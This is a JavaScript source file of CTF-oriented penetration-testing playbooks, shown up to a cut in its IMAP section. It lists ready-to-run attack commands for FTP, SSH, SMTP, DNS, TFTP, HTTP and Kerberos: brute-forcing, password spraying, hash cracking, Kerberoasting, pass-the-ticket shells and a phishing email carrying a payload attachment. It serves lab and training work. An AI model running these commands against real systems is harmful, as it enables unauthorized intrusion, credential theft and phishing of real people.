import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import yaml from 'js-yaml';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const KNOWLEDGE_DIR = path.join(__dirname, '..', 'knowledge');

const MASTER_PLAYBOOKS = [
  // ==========================================
  // 1. UNKNOWN PORT / CUSTOM DAEMON TRIAGE
  // ==========================================
  {
    id: 'unknown-service',
    name: 'Unknown Port & Custom Daemon Triage',
    category: 'network',
    description: 'Methodology for probing non-standard and unknown open ports on CTF machines. Covers banner grabbing, raw TCP socket testing, HTTP/HTTPS discovery, and aggressive Nmap fingerprinting.',
    port_triggers: [],
    service_triggers: ['unknown', 'custom'],
    tags: ['unknown', 'triage', 'banner-grabbing', 'recon'],
    steps: [
      {
        id: 'unknown-raw-socket',
        title: 'Raw Socket Connection & Banner Grab (Netcat)',
        phase: 'reconnaissance',
        purpose: 'Connect directly to the unknown open port to capture any initial service banner, greeting message, or text prompts.',
        command: 'nc -nv -w 5 {{TARGET}} {{PORT|8978}}',
        expected_output: ['(UNKNOWN) [{{TARGET}}] {{PORT}} open', '220 Service Ready / Welcome Banner / SSH-2.0-...'],
        common_mistakes: ['Not pressing Enter or sending dummy text if the daemon waits for client hello.'],
        if_success: 'Banner received! Identify the daemon protocol (HTTP, SSH, SMTP, Redis) and assign the matching playbook.',
        if_failure: 'No banner returned. Proceed to HTTP protocol probe.',
        references: ['https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/']
      },
      {
        id: 'unknown-http-probe',
        title: 'Plaintext HTTP Protocol Verification (curl)',
        phase: 'reconnaissance',
        purpose: 'Send an HTTP GET request to see if the unknown port is hosting a web application, API endpoint, or REST service.',
        command: 'curl -i -s -k "http://{{TARGET}}:{{PORT|8978}}/" -m 5',
        expected_output: ['HTTP/1.1 200 OK', 'Content-Type: text/html', '<!doctype html>'],
        common_mistakes: ['If server returns 400 Bad Request / Plaintext sent to HTTPS port, the service is HTTPS: use `https://` instead.'],
        if_success: 'Web application detected! Map this port to HTTP in Pathfinder to unlock all Web Exploitation playbooks.',
        if_failure: 'Connection reset or empty reply. Test HTTPS / TLS handshake next.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-web']
      },
      {
        id: 'unknown-https-probe',
        title: 'HTTPS / TLS Handshake & SSL Certificate Inspection',
        phase: 'reconnaissance',
        purpose: 'Probe for SSL/TLS encrypted web services and inspect the TLS certificate for internal domain names and hostnames.',
        command: 'curl -i -s -k "https://{{TARGET}}:{{PORT|8978}}/" -m 5',
        expected_output: ['HTTP/1.1 200 OK / 302 Found', 'SSL certificate verify result: self signed certificate', 'subject: CN=internal.corp.local'],
        common_mistakes: ['Forgetting `-k` (insecure flag) to ignore self-signed CTF certificates.'],
        if_success: 'HTTPS service detected! Note certificate hostnames and add to `/etc/hosts`.',
        if_failure: 'TLS handshake failed. Run aggressive Nmap script scan.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-web']
      },
      {
        id: 'unknown-nmap-deep',
        title: 'Aggressive Nmap Service & Script Fingerprinting',
        phase: 'enumeration',
        purpose: 'Run all Nmap version probes and default discovery scripts with `--version-all` to force protocol identification.',
        command: 'nmap -sV -sC -p {{PORT|8978}} --version-all -Pn {{TARGET}}',
        expected_output: ['{{PORT}}/tcp open  http  Jetty 9.4.43 / Apache / Custom Python', '|_http-title: Admin Portal'],
        common_mistakes: ['Running without `-Pn`; firewalls might drop ICMP echo requests.'],
        if_success: 'Identified exact daemon and version! Check for public exploits and CVEs.',
        if_failure: 'Service unrecognized. Test with raw Python socket script or fuzz with generic fuzzers.',
        references: ['https://nmap.org/book/man-version-detection.html']
      }
    ]
  },

  // ==========================================
  // 2. FTP (Port 21)
  // ==========================================
  {
    id: 'ftp',
    name: 'FTP Enumeration & Exploitation (Port 21)',
    category: 'network',
    description: 'Complete methodology for File Transfer Protocol (FTP) on port 21. Covers anonymous login checks, recursive downloads, brute-forcing, and common server vulnerabilities (vsftpd, ProFTPD).',
    port_triggers: [21],
    service_triggers: ['ftp'],
    tags: ['ftp', 'recon', 'enumeration', 'bruteforce'],
    steps: [
      {
        id: 'ftp-anon-netexec',
        title: 'FTP Anonymous Login Check (NetExec)',
        phase: 'reconnaissance',
        purpose: 'Verify if the FTP service allows unauthenticated (anonymous:anonymous) read/write access.',
        command: "netexec ftp {{TARGET}} -u 'anonymous' -p ''",
        expected_output: ['[*] FTP {{TARGET}}:21 (name:FTP) (success:True) (anonymous:True)'],
        common_mistakes: ['Not testing with an email string like `anonymous@corp.local` as the password.'],
        if_success: 'Anonymous access granted! Proceed to recursive file download and inspect sensitive documents.',
        if_failure: 'Anonymous access rejected. Proceed to NSE vulnerability scans and credential spraying.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp']
      },
      {
        id: 'ftp-nmap-scripts',
        title: 'FTP Nmap Vulnerability & Feature Scripts',
        phase: 'enumeration',
        purpose: 'Run NSE scripts to detect FTP anonymous access, bounce attacks, and known backdoor vulnerabilities (vsftpd 2.3.4, ProFTPD 1.3.5 mod_copy).',
        command: 'nmap -p 21 --script ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-syst -sV {{TARGET}}',
        expected_output: ['| ftp-anon: Anonymous FTP login allowed (FTP code 230)', '|_ftp-vsftpd-backdoor: VULNERABLE: vsftpd 2.3.4 backdoor'],
        common_mistakes: ['Assuming passive mode is default; try active mode if data transfer hangs behind NAT.'],
        if_success: 'Identified exact FTP server version and configuration. Check for known CVE exploits.',
        if_failure: 'No immediate vulnerabilities found. Proceed to credential bruteforcing or file download.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp']
      },
      {
        id: 'ftp-recursive-download',
        title: 'Recursive File & Configuration Download',
        phase: 'enumeration',
        purpose: 'Download all accessible directories, files, and hidden archives from the FTP server to your local machine for offline inspection.',
        command: 'wget -m --no-passive ftp://anonymous:anonymous@{{TARGET}}',
        expected_output: ['FINISHED --2024-03-20 12:00:00--', 'Downloaded: 12 files, 4.2M in 3s'],
        common_mistakes: ['Missing hidden dotfiles (e.g. `.backup`, `.env`, `.ssh/id_rsa`). Use `ls -la` inside interactive FTP.'],
        if_success: 'Files downloaded! Inspect source code, database configs, and backup archives for credentials.',
        if_failure: 'Download blocked or empty folder. Test write permissions to see if web shell upload is possible.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp']
      },
      {
        id: 'ftp-bruteforce-hydra',
        title: 'FTP Credential Spraying & Bruteforcing',
        phase: 'exploitation',
        purpose: 'Test candidate usernames against common wordlists when default or anonymous credentials fail.',
        command: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://{{TARGET}} -s 21 -f -vV',
        expected_output: ['[21][ftp] host: {{TARGET}}   login: admin   password: password123'],
        common_mistakes: ['Running too many threads (-t 16) causing server rate-limiting; stick to -t 4.'],
        if_success: 'Valid FTP credentials found! Log in and inspect private user home directories.',
        if_failure: 'Bruteforce unsuccessful. Pivot to other open service ports.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp']
      }
    ]
  },

  // ==========================================
  // 3. SSH (Port 22)
  // ==========================================
  {
    id: 'ssh',
    name: 'SSH Enumeration & Access (Port 22)',
    category: 'network',
    description: 'Methodology for Secure Shell (SSH) on port 22. Covers version auditing, supported auth algorithms, credential spraying, private key logins, and passphrase cracking.',
    port_triggers: [22],
    service_triggers: ['ssh'],
    tags: ['ssh', 'remote-access', 'credentials', 'network'],
    steps: [
      {
        id: 'ssh-banner-auth',
        title: 'SSH Banner & Supported Authentication Check',
        phase: 'reconnaissance',
        purpose: 'Inspect OpenSSH banner, OS release, and query supported authentication mechanisms (password, publickey, keyboard-interactive).',
        command: 'ssh -v -o PreferredAuthentications=none -o StrictHostKeyChecking=no root@{{TARGET}}',
        expected_output: ['OpenSSH_8.2p1 Ubuntu-4ubuntu0.5', 'debug1: Authentications that can continue: publickey,password'],
        common_mistakes: ['Assuming SSH password auth is enabled without testing PreferredAuthentications.'],
        if_success: 'Identified exact OpenSSH version and allowed authentication types.',
        if_failure: 'Connection timed out. Verify network reachability or port forwarding.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh']
      },
      {
        id: 'ssh-pass-spray',
        title: 'SSH Password Spraying (NetExec)',
        phase: 'exploitation',
        purpose: 'Test discovered target credentials across SSH with automatic rate-limit handling.',
        command: "netexec ssh {{TARGET}} -u '{{USERNAME|admin}}' -p '{{PASSWORD}}' --continue-on-success",
        expected_output: ['[+] SSH {{TARGET}}:22 ({{USERNAME}}:{{PASSWORD}}) - Logged in successfully'],
        common_mistakes: ['Locking out accounts by spraying without verifying domain/local lockout policies.'],
        if_success: 'Valid SSH credentials! Log in with interactive shell: `ssh {{USERNAME}}@{{TARGET}}`.',
        if_failure: 'Login failed. Check if user requires private key auth instead of password.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh']
      },
      {
        id: 'ssh-key-login',
        title: 'SSH Private Key Login',
        phase: 'exploitation',
        purpose: 'Authenticate to the target using an extracted or cracked RSA/Ed25519 private key file.',
        command: 'chmod 600 id_rsa && ssh -i id_rsa -o StrictHostKeyChecking=no {{USERNAME|root}}@{{TARGET}}',
        expected_output: ['Welcome to Ubuntu 22.04 LTS', '{{USERNAME}}@hostname:~$'],
        common_mistakes: ['Forgetting `chmod 600 id_rsa`; OpenSSH will reject keys with broad permissions.'],
        if_success: 'Foothold established! Stabilize TTY and proceed to Linux privilege escalation.',
        if_failure: 'Key passphrase requested or key format invalid. Convert/crack with ssh2john.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh']
      },
      {
        id: 'ssh-crack-key',
        title: 'Encrypted SSH Private Key Passphrase Cracking',
        phase: 'exploitation',
        purpose: 'Extract the hash from an encrypted SSH private key and crack its passphrase using John the Ripper.',
        command: 'ssh2john id_rsa > id_rsa.hash && john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash',
        expected_output: ['Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH 32/64])', 'passphrase123    (id_rsa)'],
        common_mistakes: ['Using full wordlist before checking rockyou.txt or candidate passwords found in notes.'],
        if_success: 'Passphrase cracked! Use cracked passphrase with `ssh -i id_rsa {{USERNAME}}@{{TARGET}}`.',
        if_failure: 'Passphrase not in wordlist. Check for custom company password mutations.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh']
      }
    ]
  },

  // ==========================================
  // 4. SMTP (Ports 25, 465, 587)
  // ==========================================
  {
    id: 'smtp',
    name: 'SMTP Email Service Enumeration (Ports 25 / 465 / 587)',
    category: 'network',
    description: 'Methodology for Simple Mail Transfer Protocol (SMTP) on ports 25, 465, and 587. Covers banner grabbing, open relay checks, VRFY/EXPN user enumeration, and phishing tests.',
    port_triggers: [25, 465, 587],
    service_triggers: ['smtp', 'smtps', 'submission'],
    tags: ['smtp', 'mail', 'recon', 'user-enumeration'],
    steps: [
      {
        id: 'smtp-nmap-relay',
        title: 'SMTP Open Relay & Script Scan',
        phase: 'reconnaissance',
        purpose: 'Check if the SMTP server is configured as an open relay and discover supported commands (STARTTLS, AUTH, VRFY).',
        command: 'nmap -p 25,465,587 --script smtp-open-relay,smtp-commands,smtp-enum-users -sV {{TARGET}}',
        expected_output: ['| smtp-open-relay: Server is an open relay (MAIL FROM:<...>)', '| smtp-commands: 250-SIZE, 250-VRFY, 250-ETRN'],
        common_mistakes: ['Not testing on port 587 (Submission) which often has different authentication rules than port 25.'],
        if_success: 'SMTP features identified! If open relay is enabled, test sending spoofed internal emails.',
        if_failure: 'Port filtered or closed. Proceed to other services.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp']
      },
      {
        id: 'smtp-user-enum',
        title: 'SMTP User Enumeration via VRFY / EXPN / RCPT',
        phase: 'enumeration',
        purpose: 'Verify valid system and domain accounts using SMTP `VRFY` and `RCPT TO` commands with smtp-user-enum.',
        command: 'smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {{TARGET}}',
        expected_output: ['[+] 10.10.10.10:25 - User "admin" exists', '[+] 10.10.10.10:25 - User "root" exists'],
        common_mistakes: ['If VRFY mode is disabled by server, switch to `-M RCPT` mode with `-D {{DOMAIN|corp.local}}`.'],
        if_success: 'Valid users discovered! Save list to `users.txt` for password spraying across SSH, SMB, and FTP.',
        if_failure: 'VRFY and RCPT rejected. Check Web or LDAP enumeration.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp']
      },
      {
        id: 'smtp-send-email',
        title: 'Send Test Email / Internal Phish (swaks)',
        phase: 'exploitation',
        purpose: 'Send an email to an internal user with attachment or credential harvesting link using the Swiss Army Knife for SMTP (swaks).',
        command: 'swaks --to {{USERNAME|admin}}@{{DOMAIN|corp.local}} --from it-support@{{DOMAIN|corp.local}} --server {{TARGET}} --body "Please review attachment" --attach /tmp/payload.pdf',
        expected_output: ['=== 250 2.0.0 Ok: queued as 4T8vK74H7zZ2...'],
        common_mistakes: ['Ensure domain matches target company internal email domain.'],
        if_success: 'Email delivered to target mailbox! Monitor listener for reverse connection.',
        if_failure: 'Authentication required. Test with discovered credentials.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp']
      }
    ]
  },

  // ==========================================
  // 5. DNS (Port 53)
  // ==========================================
  {
    id: 'dns',
    name: 'DNS Zone Transfers & Fuzzing (Port 53)',
    category: 'network',
    description: 'Methodology for Domain Name System (DNS) on port 53. Covers AXFR full zone transfers, subdomain brute-forcing, virtual host enumeration, and DNS record queries.',
    port_triggers: [53],
    service_triggers: ['dns', 'domain'],
    tags: ['dns', 'zone-transfer', 'recon', 'subdomains'],
    steps: [
      {
        id: 'dns-zone-transfer',
        title: 'DNS AXFR Full Zone Transfer',
        phase: 'reconnaissance',
        purpose: 'Attempt an unauthenticated AXFR zone transfer to dump the entire internal DNS zone table (all subdomains, mail servers, and internal IPs).',
        command: 'dig axfr @{{TARGET}} {{DOMAIN|corp.local}}',
        expected_output: [';; Query time: 10 msec', 'corp.local.    IN    SOA    ns1.corp.local.', 'dev.corp.local.  IN    A      10.10.10.50', 'mail.corp.local. IN    A      10.10.10.51'],
        common_mistakes: ['Not testing all discovered domain variants (e.g. `box.htb`, `corp.local`).'],
        if_success: 'Zone transfer succeeded! Add all discovered subdomains to `/etc/hosts` and target web apps.',
        if_failure: 'AXFR transfer refused. Proceed to active subdomain and virtual host fuzzing.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns']
      },
      {
        id: 'dns-subdomain-fuzz',
        title: 'Virtual Host & Subdomain Fuzzing (ffuf)',
        phase: 'enumeration',
        purpose: 'Enumerate hidden subdomains and virtual hosts routed by internal DNS or reverse proxies.',
        command: 'ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u {{TARGET_URL}} -H "Host: FUZZ.{{DOMAIN|corp.local}}" -mc 200,204,301,302,307,401,403 -fs 0',
        expected_output: ['admin [Status: 200, Size: 4120, Words: 310]', 'dev   [Status: 302, Size: 240, Words: 18]'],
        common_mistakes: ['Forgetting `-fs` filter size flag; default response sizes will flood terminal with false positives.'],
        if_success: 'Subdomains discovered! Add to `/etc/hosts`: `echo "{{TARGET}} admin.{{DOMAIN}} dev.{{DOMAIN}}" >> /etc/hosts`.',
        if_failure: 'No new subdomains. Check standard HTTP web directories on port 80/443.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns']
      },
      {
        id: 'dns-records-query',
        title: 'Comprehensive DNS Record Queries (TXT, CNAME, SRV)',
        phase: 'enumeration',
        purpose: 'Query specialized DNS records (TXT, SRV, CNAME) which often disclose API tokens, SPF records, or Active Directory service locations.',
        command: 'dig any @{{TARGET}} {{DOMAIN|corp.local}} +nocmd +noall +answer',
        expected_output: ['corp.local.    IN    TXT    "v=spf1 include:_spf.google.com ~all"', '_kerberos._tcp.corp.local. IN SRV 0 100 88 dc.corp.local.'],
        common_mistakes: ['Skipping SRV records which identify Domain Controllers, Kerberos, and LDAP servers.'],
        if_success: 'Discovered critical internal services and Active Directory domain controllers.',
        if_failure: 'No additional records. Continue to HTTP or Active Directory enumeration.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns']
      }
    ]
  },

  // ==========================================
  // 6. TFTP (Port 69 UDP)
  // ==========================================
  {
    id: 'tftp',
    name: 'TFTP Trivial File Transfer Protocol (Port 69 UDP)',
    category: 'network',
    description: 'Methodology for TFTP on UDP port 69. Covers unauthenticated file downloads, network configuration extraction, and blind file probing.',
    port_triggers: [69],
    service_triggers: ['tftp'],
    tags: ['tftp', 'udp', 'file-transfer', 'recon'],
    steps: [
      {
        id: 'tftp-enum-files',
        title: 'TFTP File Discovery & Download',
        phase: 'enumeration',
        purpose: 'TFTP has no directory listing capability; probe and download known filenames (id_rsa, config, running-config, shadow).',
        command: 'tftp {{TARGET}} -c get id_rsa && tftp {{TARGET}} -c get running-config.cfg',
        expected_output: ['Received 2602 bytes in 0.1 seconds'],
        common_mistakes: ['TFTP runs on UDP; ensure your firewall allows outbound UDP traffic.'],
        if_success: 'Files downloaded! Inspect configs, passwords, and private SSH keys.',
        if_failure: 'File not found. Try wordlist fuzzing for filenames with `nmap -sU -p 69 --script tftp-enum {{TARGET}}`.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/69-udp-tftp']
      }
    ]
  },

  // ==========================================
  // 7. FINGER (Port 79)
  // ==========================================
  {
    id: 'finger',
    name: 'Finger User Information Service (Port 79)',
    category: 'network',
    description: 'Methodology for Finger service on port 79. Covers banner grabbing, user enumeration, and active user home directory inspection.',
    port_triggers: [79],
    service_triggers: ['finger'],
    tags: ['finger', 'user-enumeration', 'recon'],
    steps: [
      {
        id: 'finger-user-enum',
        title: 'Finger Active User Enumeration',
        phase: 'enumeration',
        purpose: 'Query the finger service to enumerate logged-in users, real names, home directories, and office locations.',
        command: 'finger @{{TARGET}} && finger admin@{{TARGET}}',
        expected_output: ['Login: admin     Name: Administrator', 'Directory: /home/admin     Shell: /bin/bash', 'On since Mon Aug 31 10:00 on pts/0'],
        common_mistakes: ['If `finger @target` is disabled, query individual candidate usernames (`finger root@target`).'],
        if_success: 'Valid system users discovered! Save list for password spraying.',
        if_failure: 'Service disabled or filtered. Proceed to other open services.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger']
      }
    ]
  },

  // ==========================================
  // 8. HTTP / HTTPS (Port 80 / 443 / 8080 / 8978)
  // ==========================================
  {
    id: 'http',
    name: 'Web Application Reconnaissance (Port 80 / 443 / Custom Web)',
    category: 'web',
    description: 'Structured methodology for web services on ports 80, 443, 8080, 8978, and any custom web port. Covers technology fingerprinting, directory/file discovery, API endpoints, and parameter fuzzing.',
    port_triggers: [80, 443, 8000, 8080, 8443, 8978],
    service_triggers: ['http', 'https', 'web', 'http-alt'],
    tags: ['web', 'http', 'https', 'fuzzing', 'recon'],
    steps: [
      {
        id: 'http-whatweb',
        title: 'Web Technology & CMS Fingerprinting (WhatWeb)',
        phase: 'reconnaissance',
        purpose: 'Identify web server software, CMS (WordPress, Joomla, Drupal), frameworks (Django, Laravel, Spring), PHP version, and cookies.',
        command: 'whatweb -a 3 {{TARGET_URL}}',
        expected_output: ['{{TARGET_URL}} [200 OK] Apache[2.4.41], Bootstrap, HTTPServer[Ubuntu Linux], PHP[7.4.3], Title[Welcome]'],
        common_mistakes: ['Not inspecting raw HTTP response headers for internal framework details (e.g. `X-Powered-By`).'],
        if_success: 'Identified web stack! Check for known CVEs for the specific CMS/framework versions.',
        if_failure: 'Generic response. Proceed to directory and virtual host discovery.',
        references: ['https://portswigger.net/web-security', 'https://book.hacktricks.xyz/network-services-pentesting/pentesting-web']
      },
      {
        id: 'http-dir-fuzz',
        title: 'Directory & File Discovery (ffuf)',
        phase: 'enumeration',
        purpose: 'Fuzz for hidden administration panels, backup files, `.git` repositories, configuration files, and API routes.',
        command: 'ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u {{TARGET_URL}}/FUZZ -mc 200,204,301,302,307,401,403 -e .php,.html,.txt,.bak,.json',
        expected_output: ['admin                 [Status: 301, Size: 178]', 'config.php.bak        [Status: 200, Size: 1420]', 'api                   [Status: 200, Size: 520]'],
        common_mistakes: ['Not fuzzing file extensions (`-e .php,.txt,.bak,.json`); hidden backup files are high-value targets.'],
        if_success: 'Discovered hidden paths! Browse to discovered endpoints and inspect source code.',
        if_failure: 'No directories found. Test alternative wordlists (e.g. `common.txt` or `directory-list-2.3-medium.txt`).',
        references: ['https://portswigger.net/web-security']
      },
      {
        id: 'http-vhost-fuzz',
        title: 'Virtual Host / Host Header Routing Fuzzing',
        phase: 'enumeration',
        purpose: 'Detect virtual hosts on the same IP by fuzzing the `Host:` request header.',
        command: 'ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u {{TARGET_URL}} -H "Host: FUZZ.{{DOMAIN|corp.local}}" -fs 0',
        expected_output: ['portal   [Status: 200, Size: 3410, Words: 280]'],
        common_mistakes: ['Forgetting to add newly discovered virtual hosts to `/etc/hosts` on your attacking machine.'],
        if_success: 'Virtual host found! Add to `/etc/hosts` and scan the newly mapped application.',
        if_failure: 'No virtual hosts configured. Proceed to parameter fuzzing and web vulnerability testing.',
        references: ['https://portswigger.net/web-security']
      },
      {
        id: 'http-param-fuzz',
        title: 'GET / POST Parameter Discovery',
        phase: 'enumeration',
        purpose: 'Discover hidden input parameters on pages that accept query strings (often vulnerable to LFI, SSRF, or SQLi).',
        command: 'ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u {{TARGET_URL}}/index.php?FUZZ=test -fs 0',
        expected_output: ['page     [Status: 200, Size: 2410, Words: 190]', 'file     [Status: 200, Size: 1800, Words: 120]'],
        common_mistakes: ['Testing only GET requests; some parameters are only processed via POST body.'],
        if_success: 'Input parameter found! Test for LFI (`?page=`), Command Injection (`?cmd=`), and SQLi (`?id=`).',
        if_failure: 'No parameters found. Inspect JavaScript source files for client-side API endpoints.',
        references: ['https://portswigger.net/web-security']
      }
    ]
  },

  // ==========================================
  // 9. KERBEROS (Port 88)
  // ==========================================
  {
    id: 'kerberos',
    name: 'Kerberos Attacks (Port 88)',
    category: 'network',
    description: 'Comprehensive Active Directory Kerberos attack methodology on port 88. Covers user enumeration (Kerbrute), AS-REP Roasting, Kerberoasting SPN accounts, and Pass-the-Ticket.',
    port_triggers: [88],
    service_triggers: ['kerberos', 'kpasswd'],
    tags: ['kerberos', 'active-directory', 'kerberoasting', 'asreproast', 'timeroasting', 'timeroast'],
    steps: [
      {
        id: 'kerb-userenum',
        title: 'Kerberos Fast User Enumeration (Kerbrute)',
        phase: 'enumeration',
        purpose: 'Systematically validate domain usernames against Kerberos without generating login failure events in event logs.',
        command: 'kerbrute userenum --dc {{TARGET}} -d {{DOMAIN|corp.local}} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt',
        expected_output: ['[+] VALID USERNAME:   administrator@corp.local', '[+] VALID USERNAME:   svc_backup@corp.local', '[+] VALID USERNAME:   jdoe@corp.local'],
        common_mistakes: ['Not syncing your machine time with the Domain Controller (`sudo ntpdate {{TARGET}}`); Kerberos fails if clock skew > 5 mins.'],
        if_success: 'Valid users discovered! Save list to `users.txt` and proceed to AS-REP Roasting.',
        if_failure: 'Clock skew error or domain unreachable. Ensure `/etc/hosts` has `{{TARGET}} {{DOMAIN}}`.',
        references: ['https://wadcoms.github.io/', 'https://book.hacktricks.xyz/windows-hardening/active-directory-methodology']
      },
      {
        id: 'kerb-asreproast',
        title: 'AS-REP Roasting (No Pre-Authentication Required)',
        phase: 'exploitation',
        purpose: 'Request TGT tickets for accounts with DONT_REQ_PREAUTH set; tickets contain crackable encrypted hashes that require ZERO credentials.',
        command: "impacket-GetNPUsers '{{DOMAIN|corp.local}}/' -usersfile users.txt -format hashcat -outputfile asrep.hashes -dc-ip {{TARGET}}",
        expected_output: ['$krb5asrep$23$svc_backup@corp.local:283a218...'],
        common_mistakes: ['Forgetting to run this check before having credentials; AS-REP Roasting works completely unauthenticated.'],
        if_success: 'AS-REP hash extracted! Crack with Hashcat mode 18200: `hashcat -m 18200 asrep.hashes rockyou.txt`.',
        if_failure: 'No accounts with Pre-Auth disabled. Proceed to Kerberoasting once valid user credentials are obtained.',
        references: ['https://wadcoms.github.io/']
      },
      {
        id: 'kerb-roast-spn',
        title: 'Kerberoasting (Extract Service Account TGS Hashes)',
        phase: 'exploitation',
        purpose: 'Query Service Principal Names (SPNs) registered in Active Directory and extract crackable TGS ticket hashes for service accounts (e.g. MSSQL, IIS, Backup).',
        command: "impacket-GetUserSPNs '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}' -dc-ip {{TARGET}} -request -outputfile kerberoast.hashes",
        expected_output: ['ServicePrincipalName    Name        MemberOf', 'MSSQLSvc/sql.corp.local:1433  svc_sql     CN=Domain Admins...', '$krb5tgs$23$*svc_sql*corp.local*...'],
        common_mistakes: ['Not testing with domain-joined guest account if no user credentials are known.'],
        if_success: 'TGS hash captured! Crack with Hashcat mode 13100: `hashcat -m 13100 kerberoast.hashes rockyou.txt -r best64.rule`.',
        if_failure: 'No SPNs found or account credentials invalid. Check LDAP descriptions or SMB shares.',
        references: ['https://wadcoms.github.io/']
      },
      {
        id: 'kerb-timeroast',
        title: 'Timeroasting (Extract MS-SNTP Hashes from W32Time)',
        phase: 'exploitation',
        purpose: 'Query Windows Time Service (W32Time) on the Domain Controller over UDP port 123 using RID ranges to extract crackable MS-SNTP MD5 authentication digests with zero initial credentials.',
        command: "nxc smb {{TARGET}} -u '' -p '' -M timeroast",
        expected_output: ['[*] Querying DC for RID 500 (Administrator)...', '$ntp$1$82f9...$91b3...', '[+] Captured MS-SNTP hash for Administrator'],
        common_mistakes: [
          'If NetExec fails, fallback to standalone script: python3 timeroast.py --dc-ip {{TARGET}} -r 500-2000 -outputfile timeroast.hashes.',
          'W32Time uses UDP port 123; ensure UDP traffic to the DC is not filtered.'
        ],
        if_success: 'MS-SNTP hash captured! Crack with Hashcat mode 31300: `hashcat -m 31300 timeroast.hashes rockyou.txt -r best64.rule`.',
        if_failure: 'Target DC does not support W32Time authentication or UDP port 123 is closed.',
        references: ['https://github.com/Secarma/timeroast', 'https://hashcat.net/wiki/doku.php?id=example_hashes']
      },
      {
        id: 'kerb-pass-the-ticket',
        title: 'Pass-the-Ticket (TGT / TGS Injection)',
        phase: 'exploitation',
        purpose: 'Inject a captured `.ccache` or `.kirbi` Kerberos ticket into your current terminal session to execute remote commands without knowing the plaintext password.',
        command: "export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass {{DOMAIN|corp.local}}/administrator@{{TARGET}}",
        expected_output: ['[*] Requesting shares on {{TARGET}}...', '[*] Found writable share ADMIN$', '[*] Opening interactive shell...'],
        common_mistakes: ['Using IP instead of Hostname/FQDN; Kerberos ticket verification strictly requires hostname matching.'],
        if_success: 'Administrator SYSTEM shell spawned via Kerberos ticket delegation!',
        if_failure: 'Ticket expired or clock skew. Check ticket lifetime with `klist`.',
        references: ['https://wadcoms.github.io/']
      }
    ]
  },

  // ==========================================
  // 10. POP3 & IMAP (Ports 110 / 995 / 143 / 993)
  // ==========================================
  {
    id: 'mail-pop3-imap',
    name: 'POP3 & IMAP Mail Service Exploitation (Ports 110 / 143 / 993 / 995)',
    category: 'network',
    description: 'Methodology for POP3 and IMAP mailboxes on ports 110, 995, 143, and 993. Covers NTLM domain info leak, interactive mailbox reading, and downloading credentials.',
    port_triggers: [110, 143, 993, 995],
    service_triggers: ['pop3', 'pop3s', 'imap', 'imaps'],
    tags: ['pop3', 'imap', 'email', 'credentials', 'recon'],
    steps: [
      {
        id: 'mail-ntlm-info',
        title: 'POP3 / IMAP NTLM Domain Information Leak',
        phase: 'reconnaissance',
        purpose: 'Query the POP3/IMAP NTLM authentication banner to extract the internal Domain name, Computer NetBIOS name, and DNS forest hierarchy.',
        command: 'nmap -p 110,143,993,995 --script pop3-ntlm-info,imap-ntlm-info -sV {{TARGET}}',
        expected_output: ['| pop3-ntlm-info: Target_Name: CORP, NetBIOS_Domain_Name: CORP, DNS_Domain_Name: corp.local'],
        common_mistakes: ['Not inspecting TLS certificates on port 993/995 for additional virtual hostnames.'],
        if_success: 'Internal domain and DC hostname recovered! Update target domain name.',
        if_failure: 'NTLM auth not enabled. Proceed to interactive login.',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop']
      },
      {
        id: 'mail-pop3-read',
        title: 'POP3 Interactive Login & Email Retrieval',
        phase: 'enumeration',
        purpose: 'Log into the POP3 inbox using valid credentials and retrieve stored emails containing passwords, activation links, or backup codes.',
        command: 'curl "pop3://{{TARGET}}" -u "{{USERNAME}}:{{PASSWORD}}" -v',
        expected_output: ['+OK Logged in.', '1 1420', '2 5120'],
        common_mistakes: ['To read specific email messages, use `curl "pop3://{{TARGET}}/1" -u "{{USERNAME}}:{{PASSWORD}}"`.'],
        if_success: 'Emails accessed! Download all messages and inspect for credentials.',
        if_failure: 'Authentication failed. Check if SSL/TLS is required (`pop3s://`).',
        references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop']
      },
      {
        id: 'mail-imap-read',
        title: 'IMAP Secure Mailbox Inspection (openssl)',
        phase: 'enumeration',
        purpose: 'Connect to IMAPS over TLS to inspect folders, read inbox messages, and search for sensitive attachments.',
        command: 'openssl s_client -connect {{TARGET}}:993 -crlf -quiet',
